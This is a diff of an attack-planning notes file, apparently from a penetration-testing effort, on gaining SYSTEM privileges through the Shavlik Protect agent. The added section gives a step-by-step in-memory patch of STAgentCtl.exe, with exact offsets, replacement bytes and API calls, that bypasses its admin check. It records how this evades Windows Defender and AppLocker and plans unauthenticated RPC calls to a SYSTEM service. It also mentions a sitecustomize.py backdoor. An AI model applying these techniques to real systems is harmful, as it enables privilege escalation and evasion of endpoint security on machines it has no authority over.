@@ -136,10 +136,32 @@ Files dropped in `C:\ProgramData\LANDESK\Shavlik Protect\Agent\New\` and `FTQ\` 
 
 ## Attack Vectors (Priority Order)
 
-### A. Patch STAgentCtl.exe Admin Check (HIGH)
-Copy STAgentCtl.exe to `C:\Windows\Tasks\` (AppLocker-allowed via `%WINDIR%\*`), patch the admin check, then use the `dispatch` command to send RPC commands to STDispatch (which runs as SYSTEM and doesn't authenticate).
+### A. ✅ Patch STAgentCtl.exe Admin Check — IN-MEMORY (HIGH, DONE)
+**Status: Admin check bypass ACHIEVED. But RPC commands still fail with "Unknown error".**
 
-**Patch target:** The `"This operation requires administrative rights"` error string at file offset `0x349E0` (RVA `0x35BE0`). The check uses `OpenProcessToken` + custom SID/group check.
+Binary patching via file modification triggers Windows Defender (blocks read/execute). **In-memory patching** using Add-Type C# works reliably:
+
+**Patch technique:**
+1. Start STAgentCtl.exe suspended: `CreateProcess(exe, args, ..., CREATE_SUSPENDED)`
+2. Get PEB: `NtQueryInformationProcess(hProcess, 0, pbi, 48, &retLen)` — **MUST use 48 bytes not 24** on x64
+3. Read PEB at offset 8 → `ImageBaseAddress` at PEB offset 0x10
+4. **Patch 1** (admin check function return): `WriteProcessMemory(hp, ImageBase+0x1DCF4, [0xB8,0x01,0,0,0,0xC3,0x90])`
+   - Replaces `33 C9 E8 25 E8 FE FF` (XOR ECX,ECX; CALL admin_check) with `B8 01 00 00 00 C3 90` (MOV EAX,1; RET; NOP)
+5. **Patch 2** (error display NOP): `WriteProcessMemory(hp, ImageBase+0x1DD20, 12x 0x90)`
+   - NOPs `48 8D 0D B9 7E 01 00 E8 F4 E7 FE FF` (LEA error_string; CALL error_display)
+6. ResumeThread, capture output via file-redirected handles
+
+**Result:** `help` works (exit 0, full usage text). `status`/`available-tasks`/`dispatch` return exit -1 with "Unknown error".
+
+**Error string locations:**
+- `"This operation requires administrative rights"` at file offset `0x349E0`, RVA `0x35BE0`, referenced by LEA at 0x1D120
+- `"Unknown error"` at file offset `0x34930`, RVA `0x35B30`, referenced by LEA at 0x1C5E8
+
+**File patching fails:** Modified STAgentCtl.exe written to C:\Windows\Tasks\ is blocked by Windows Defender (access denied on read/execute). Python-written copies get flagged immediately. In-memory avoids this.
+
+**Output capture requires:** `CreateFile` + `SetHandleInformation(h, HANDLE_FLAG_INHERIT, 1)` + `STARTF_USESTDHANDLES`. Anonymous pipes don't work for console apps; file handles do.
+
+**C# code structure:** Add-Type with P/Invoke to kernel32 (CreateProcess, Read/WriteProcessMemory, NtQueryInformationProcess, CreateFile, SetHandleInformation, ResumeThread, WaitForSingleObject).
 
 ### B. Direct RPC Call via NdrClientCall3 (HIGH)
 All 6 endpoints bind without authentication. The MIDL format strings exist in `STAgentFramework.dll` and `STDispatch.exe`. If extracted, `NdrClientCall3` can call `DispatchTask` or `DispatchCheckInAndUpdateAll` directly with SYSTEM privileges — bypassing both the admin check AND STAgentCtl.exe entirely.
@@ -163,6 +185,8 @@ Directories created with `sitecustomize.py` backdoor. No SYSTEM process on this 
 - **STAgent service start:** Blocked by Avecto (SCM hooks)
 - **SCHTASKS create:** Blocked by Avecto for all task creation
 - **Printer Driver EoP:** Mitigated by Dec 2024 patches (`RestrictDriverInstallationToAdministrators`)
+- **File patching STAgentCtl.exe:** Windows Defender blocks modified binary (access denied on read/execute). In-memory patching bypasses this.
+- **Admin check bypass → "Unknown error":** Admin check is bypassed (help works), but RPC commands (status, dispatch) fail with "Unknown error" at 0x34930. Cause unknown: could be skipped initialization, second admin check, or unregistered agent state.
 
 ## Important File Locations
 - `dataCache.dat`: `Agent\dataCache.dat` — event cache, 816 bytes
@@ -185,4 +209,6 @@ Directories created with `sitecustomize.py` backdoor. No SYSTEM process on this 
 
 DLL imports: KERNEL32, ADVAPI32, SHELL32, ole32, OLEAUT32, STAgentFramework, MSVCP140, STCore, STServiceProcess, WS2_32, VCRUNTIME140, SHLWAPI, USERENV, PSAPI
 
-**Error string:** `"This operation requires administrative rights"` at file offset `0x349E0`, RVA `0x35BE0`.
+**Error strings:**
+- `"This operation requires administrative rights"` at file offset `0x349E0`, RVA `0x35BE0`, LEA reference at file offset `0x1D120` (RVA `0x1DD20`)
+- `"Unknown error"` at file offset `0x34930`, RVA `0x35B30`, LEA reference at file offset `0x1C5E8` (RVA `0x1D1E8`)
